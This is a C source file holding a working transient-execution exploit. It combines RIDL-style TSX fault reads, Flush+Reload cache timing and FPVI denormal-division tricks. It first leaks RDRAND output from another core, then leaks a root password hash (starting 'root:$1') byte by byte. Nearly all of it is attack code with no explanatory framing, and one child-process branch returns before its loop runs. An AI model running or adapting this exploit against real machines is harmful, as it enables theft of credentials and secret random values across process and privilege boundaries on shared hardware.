#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/time.h>
#include <sched.h>
#include <sys/wait.h>
#include <fcntl.h>


static inline __attribute__((always_inline)) void lfence() {
	asm volatile ("lfence\n");
}

static inline __attribute__((always_inline)) void mfence() {
	asm volatile ("mfence\n");
}

static inline __attribute__((always_inline)) void clflush(void* p) {
	asm volatile("clflush (%0)\n"::"r"(p));
}

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
	uint64_t lo, hi;
	asm volatile("rdtsc\n" : "=a" (lo), "=d" (hi) :: "rcx");
	return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
	uint64_t lo, hi;
	asm volatile("rdtscp\n" : "=a" (lo), "=d" (hi) :: "rcx");
	return (hi << 32) | lo;
}

void flush_all(char *buff, int stride){
	for (size_t k = 0; k < 256; ++k) {
		// size_t x = ((k * 167) + 13) & (0xff);
        clflush(buff + (k*stride));
    }
}

static __always_inline void ridl(unsigned char *leak, unsigned char *buff_0){
    asm volatile(
        "clflush (%0)\nsfence\n" // Setup Flushes
        "xbegin 1f\nmovdqu 0x0(%0), %%xmm0\nmovq %%xmm0, %%rax\nmovq %%rax, %%rbx\n" // Faulty read

        "andq $0xff, %%rax\n"       // Mask out everything but the 1st byte
        "shlq $12, %%rax\n"         // Multiply by 4096 (page size)
        "movq (%1, %%rax), %%rax\n" // Touch timing_buff_0
    
        "xend\n1:\n" // End
        ::"r"(leak), "r"(buff_0):"rax","rbx","xmm0"
    );
}

static inline __attribute__((always_inline)) void masked_ridl_with_rot(
    unsigned char *leak, unsigned char *fb, register uintptr_t index, register uintptr_t mask, unsigned char *r_buff) {
	asm volatile(
	"clflush (%0)\n"
	"sfence\n"
	"clflush (%1)\n"

	"xbegin 1f\n"

    "movq $0xffffffffffffff, %%r11\n"

	"movq (%0), %%rax\n"          // leak 8 byte (little endian) starting from 'index' into %%rax
    "xorq  %2, %%rax\n"           // Mask out only one "unknown" byte
    "andq %%r11, %%rax\n"         // zero out first byte
    "rol $0x10, %%rax\n"
	"shl $0xc, %%rax\n"           // %%rax * 4096
	"movq (%%rax, %3), %%rax\n"

	"xend\n"
	"1:\n"
	:
    :"r"(leak+index), "r"(fb), "r"(mask), "r"(r_buff)
    :"rax", "r11", "xmm0"
	);
    mfence();
}


int probe_buffer(int stride, int cutoff, unsigned char *buff, int votes[256]){
    unsigned char *test_src;
    volatile register unsigned char test_dest;
    int found = 0;
    uint64_t min_timing = 999999;
    unsigned char min_char;
    for (size_t k = 0; k < 256; ++k) {
        size_t x = ((k * 167) + 13) & (0xff);
        test_src = buff + (stride * x);
        
        uint64_t t1s = rdtscp();  // Start Timer
        test_dest = *test_src; // Read char from location
        lfence(); // Wait until all loads are completed
        uint64_t diff = rdtscp() - t1s; // End Timer

        if (diff < cutoff && x!=0 && x!=0x20 && diff >0) {
            votes[x]+=1;
            if (min_timing>diff) {
                min_timing = diff;
                min_char = (unsigned char)x;
            }
            found = 1;
        }
    }
    // if (found) {
    //     printf("[!] Hit on at least (%c) %ld\n", min_char, min_timing);
    // }
    return found;
}

unsigned char interpret_votes(int votes[256]){
    unsigned char most_votes = 0;
    int max_v = 0;
    for (int i=0; i<256; i++) {
        if (votes[i] > max_v) {
            max_v = votes[i];
            most_votes = i;
        }
    }
    return most_votes;
}

// --- Constants for Optimization ---
#define MAX_REPETITIONS 1000  // Increased max, but we exit early
#define CHECK_INTERVAL 5      // Check for success every N reps
#define MIN_VOTES 10          // Minimum votes required to consider a winner
#define WIN_MARGIN 2          // Winner must have 2x the votes of the runner-up

// Returns the index of the winner, or -1 if no clear winner yet
int check_winner(int votes[256], int avoid) {
    int max_v = -1;
    int max_i = -1;
    int runner_up_v = -1;

    for (int i = 0; i < 256; i++) {
        if (i==avoid) continue;
        if (votes[i] > max_v) {
            runner_up_v = max_v;
            max_v = votes[i];
            max_i = i;
        } else if (votes[i] > runner_up_v) {
            runner_up_v = votes[i];
        }
    }

    // Heuristics for early exit
    if (max_v >= MIN_VOTES) {
        if (runner_up_v == 0 || (max_v / (runner_up_v + 1) >= WIN_MARGIN)) {
            return max_i;
        }
    }
    return -1;
}

char collect_value(uint8_t index, int stride, int cutoff, int avoid, unsigned char *leak, unsigned char *buff){
    int votes_0[256] = {0};

    madvise(leak, stride, MADV_DONTNEED);
    int finalized_a = -1;

    for (int r=0;r<MAX_REPETITIONS;r++){
        flush_all(buff, stride);

        ridl(leak, buff);

        asm volatile("mfence\n");
        // One round of timing checks
        probe_buffer(stride, cutoff, buff, votes_0);

        // Only check every few rounds to save CPU cycles on the check logic itself
        if (r > 10 && r % CHECK_INTERVAL == 0) {
            if (finalized_a == -1) finalized_a = check_winner(votes_0, avoid);

            if (finalized_a != -1) {
                break;
            }
        }
    }

    return (finalized_a != -1) ? finalized_a : interpret_votes(votes_0);
}

#define RAND_DELAY 100000

#define STRIDE 4096
#define REGION_START 8*4
#define REGION_LEN 4
#define RDRAND_ITERS 4

uint64_t GetTimeStamp() {
    struct timeval tv;
    gettimeofday(&tv,NULL);
    return tv.tv_sec*(uint64_t)1000000+tv.tv_usec;
}


// PHASE 1: LEAK rdrands
static __always_inline double make_denormal(uint64_t bits){
    uint64_t mask = (1ull << 52) -1;
    uint64_t masked = bits & mask;
    if (masked == 0) masked += 1;
    double denormal = 0.0;
    memcpy(&denormal, &masked, sizeof(denormal));
    return denormal;
}

static __always_inline uint64_t architectural(double *denormalX, double *denormalY){
    uint64_t out;
    asm volatile(      
        // Repeat the leak a few times
        "movq (%1), %%xmm0\nmovq (%2), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div

        // Leak Transient result byte
        "movq %%xmm0,%0\n"
        :"=r"(out):"r"(denormalX),"r"(denormalY):"xmm0","xmm1"
    );
    return out;
}

static __always_inline void fpvi(double *denormalX, double *denormalY, unsigned char *buff, uint8_t leak_offset){
    // Prevent speculation by branch (maybe hacky but for debug)
    asm volatile(      
        // Repeat the leak a few times (maybe try different pairs of registers to avoid the slow mov)
        "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div
        "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div
        "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div
        "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div

        // Leak Transient result byte
        "movq %%xmm0,%%rax\nshr %%cl, %%rax\n"
        "andq $0xff, %%rax\n"       // Mask out everything but the 1st byte
        "shlq $12, %%rax\n"         // Multiply by 4096 (page size)
        "movq (%2, %%rax), %%rax\n" // Touch timing_buff_0
        ::"r"(denormalX), "r"(denormalY), "r"(buff), "c"(leak_offset*8):"rax","xmm0","xmm1"
    );
}

char collect_value_fpvi(uint8_t index, int stride, int cutoff, double denormalX, double denormalY, unsigned char avoid, unsigned char *buff){
    int votes_0[256] = {0};

    int finalized = -1;

    for (int r=0;r<MAX_REPETITIONS;r++){
        flush_all(buff, stride);

        // Maybe try repeating this
        fpvi(&denormalX, &denormalY, buff, index);
        fpvi(&denormalX, &denormalY, buff, index);

        asm volatile("mfence\n");
        // One round of timing checks
        probe_buffer(stride, cutoff, buff, votes_0);

        // Only check every few rounds to save CPU cycles on the check logic itself
        if (r > 10 && r % CHECK_INTERVAL == 0) {
            if (finalized == -1) finalized = check_winner(votes_0, (int)avoid);

            if (finalized != -1) {
                break;
            }
        }
    }

    return (finalized != -1) ? finalized : interpret_votes(votes_0);
}

uint64_t find_prefix(unsigned char *timing_buff, unsigned char *values, int start_index){
    char fallbacks[sizeof(uint64_t)] = {0};
    unsigned char leaked[sizeof(double)] = {0};

    double denormalX = make_denormal(*(uint64_t *)&values[start_index]);
    double denormalY = make_denormal(*(uint64_t *)&values[start_index+sizeof(double)]);

    uint64_t arch = architectural(&denormalX, &denormalY);
    unsigned char *arch_bytes = (unsigned char *)&arch;

    // printf("[%%] Leaking Denormed X/Y:\n");
    // printf(" |- Denormed X: %a\n |- Denormed Y: %a \n", denormalX, denormalY);

    for (uint8_t index=0;index<sizeof(double);index++) {
        char leak = collect_value_fpvi(index, STRIDE, 160, denormalX, denormalY, arch_bytes[index], timing_buff);
        if (leak==arch_bytes[index] || leak==0x0) {
            leaked[index] = collect_value_fpvi(index, STRIDE, 160, denormalX, denormalY, 0, timing_buff);;
            fallbacks[index] = 1;
        } else {
            leaked[index] = leak;
            fallbacks[index] = 0;
        }
    }

    return *(uint64_t *)&leaked;
}

int phase1(unsigned char *leak, unsigned char *timing_buff, int amount_to_read, int sentinel_index){
    unsigned char values[4*amount_to_read];

    pid_t pid = fork();
    if (pid == 0) {
        // In Fetcher

        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(5, &set);
        return sched_setaffinity(0, sizeof(set), &set);
        while (1) {
            asm volatile("movabs $0x80000002, %%rax\ncpuid\n":::"rax","ebx","ecx","edx");
            usleep(1000);
        }
        _exit(0);
    }
    if (pid < 0) return -1;

    // In Leaker
    unsigned char leaked_last_first = 0;
    int ignore_run = 1;
    int c = 0;
    while(c<amount_to_read*4){
        values[c+sentinel_index] = collect_value(REGION_START, STRIDE, 160, -1, leak+REGION_START+sentinel_index, timing_buff);

        if (leaked_last_first==values[c+sentinel_index]) {
            continue;
        }
        leaked_last_first = values[c+sentinel_index];

        for (uint8_t index=REGION_START;index<REGION_START+REGION_LEN;index++) {
            values[c+(index-REGION_START)] = collect_value(index, STRIDE, 160, -1, leak+index, timing_buff);
        }

        c+=REGION_LEN;
        if (ignore_run) {
            c -= REGION_LEN;
            ignore_run = 0;
            continue;
        }
    }
    
    printf("[$] RDRAND Values Collected:\n |> ");
    for (int i=0;i<4*RDRAND_ITERS;i++) {
        printf("%02x", values[i]);
        if (i%4 == 3 && i < (4*RDRAND_ITERS)-1) printf("\n |> ");
    }
    printf("\n\n");

    // Phase 1b: Collect Prefixes
    printf("[$] Finding Prefix:");
    uint64_t prefix_a = find_prefix(timing_buff, values, 0);
    uint64_t prefix_retry = find_prefix(timing_buff, values, 0);
    while (prefix_a!=prefix_retry) {
        prefix_a = prefix_retry;
        prefix_retry = find_prefix(timing_buff, values, 0);
    }

    uint64_t prefix_b = find_prefix(timing_buff, values, 2*sizeof(double));
    prefix_retry = find_prefix(timing_buff, values, 2*sizeof(double));
    while (prefix_b!=prefix_retry) {
        prefix_b = prefix_retry;
        prefix_retry = find_prefix(timing_buff, values, 2*sizeof(double));
    }
    char prefix[sizeof(double)*2] = {};
    memcpy(prefix, &prefix_a, sizeof(double));
    memcpy(prefix+sizeof(double), &prefix_b, sizeof(double));

    printf("\n |=> %016" PRIx64 "%016" PRIx64 "\n", prefix_a, prefix_b);
    kill(pid, SIGKILL); // Clean up child process
    return 0;
}

// Phase 2: Leak Hash
#define MAX_WAITING_BEFORE_RETRY 40

int is_hash_char(unsigned char c) {
    static const char VALID_HASH_CHARS[] = 
        "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz$:";
    return (strchr(VALID_HASH_CHARS, c) != NULL) && c!=0;
}

char collect_value_masked(uint8_t index, int stride, int cutoff, unsigned char *leak, unsigned char *buff, uint64_t mask){
    int votes_0[256] = {0};
    // memset(votes_0, 0, 256);

    madvise(leak, stride, MADV_DONTNEED);
    int finalized_a = -1;

    for (int r=0;r<MAX_REPETITIONS;r++){
        flush_all(buff, stride);

        for (int i=0; i<500; i++) masked_ridl_with_rot(leak, buff, index, mask, buff);

        if (probe_buffer(stride, cutoff, buff, votes_0)) return interpret_votes(votes_0);
    }

    return 0;
}

int leak_hash(unsigned char *leak, unsigned char *timing_buff){
    // In Leaker
    unsigned char leaked[40] = {0};
    memcpy(leaked, "root:$1", 7);

    int i;
    int initial = 7, c = 7;
    uint64_t mask;

    fprintf(stderr, "[=] Leaking Hash:\n |> %s", leaked);
    uint64_t sp = GetTimeStamp();

    int count_waiting = 0;
    int retried = 0;
    while(c<39){
        // if (count_waiting>MAX_WAITING_BEFORE_RETRY && !retried) {c-=2; retried=1;}
        i = c-initial+1;
        mask = *((uint64_t *)&leaked[i]) & 0xffffffffffff;
        leaked[c] = collect_value_masked(i, STRIDE, 100, leak, timing_buff, mask);
        if (!is_hash_char(leaked[c])) {
            count_waiting+=1; continue;
        }
        fprintf(stderr, "%c", leaked[c]);

        c++;
        retried = 0;
    }

    printf("\n |=> As String: %s\n", leaked);

    uint64_t se = GetTimeStamp();
    printf(" |= Took %ld s\n", (se-sp)/1000000);

    return 0;
}

#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB)

int main(){
	unsigned char *leak = mmap((void *)0xc0000000, 4096*2, PROT_READ | PROT_WRITE, MMAP_FLAGS & ~MAP_HUGETLB, -1, 0);
    unsigned char *timing_buff = (unsigned char *)mmap(NULL, 4096*256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0) + 0x80;

    if ((long)timing_buff <= 0x80 || leak < 0) {
        perror("[!] Failed to alloc");
        _exit(1);
    }

    // Phase 1: Rand FPVI
    phase1(leak, timing_buff, RDRAND_ITERS, 3);
    
    // // Phase 2: Hash Leak
    leak_hash(leak, timing_buff);
}